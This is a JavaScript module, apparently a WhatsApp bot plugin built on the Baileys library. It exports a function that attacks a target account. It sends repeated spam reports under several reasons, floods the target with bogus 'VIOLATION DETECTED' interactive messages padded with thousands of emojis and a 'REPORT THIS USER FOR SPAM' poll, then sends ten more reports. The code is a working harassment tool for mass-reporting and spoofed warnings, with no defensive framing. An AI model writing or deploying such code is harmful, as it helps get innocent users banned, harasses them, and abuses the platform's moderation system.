const { delay } = require('@whiskeysockets/baileys');

async function report(sock, target) {
    try {
        // 1. Send multiple Spam Reports with different reasons
        const reasons = ['spam', 'abuse', 'illegal', 'fraud', 'harmful'];
        for (const reason of reasons) {
            await sock.report(target, {
                reason: reason,
                spam: true
            });
            await delay(300);
        }

        // 2. Send "BANNABLE" Interactive Payloads
        const payloads = [
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: { title: "VIOLATION DETECTED", hasSubtitle: true },
                            body: { text: "⚠️ This account has been flagged for violating WhatsApp Terms of Service. " + "🚩".repeat(2000) },
                            nativeFlowMessage: {
                                buttons: [{
                                    name: "single_select_reply",
                                    buttonParamsJson: JSON.stringify({
                                        title: "Confirm Violation",
                                        sections: [{ title: "Select", rows: [{ title: "Spam", id: "1" }] }]
                                    })
                                }]
                            }
                        }
                    }
                }
            },
            {
                pollCreationMessage: {
                    name: "REPORT THIS USER FOR SPAM",
                    options: [{ optionName: "YES" }, { optionName: "NO" }],
                    selectableOptionsCount: 1
                }
            }
        ];

        for (const p of payloads) {
            await sock.relayMessage(target, p, { participant: { jid: target } });
            await delay(500);
        }

        // 3. Flood with report stanzas
        for (let i = 0; i < 10; i++) {
            await sock.report(target, { reason: 'spam', spam: true });
            await delay(200);
        }
        
    } catch (e) {
        console.log("Report/Ban error:", e.message);
    }
}

module.exports = { report };
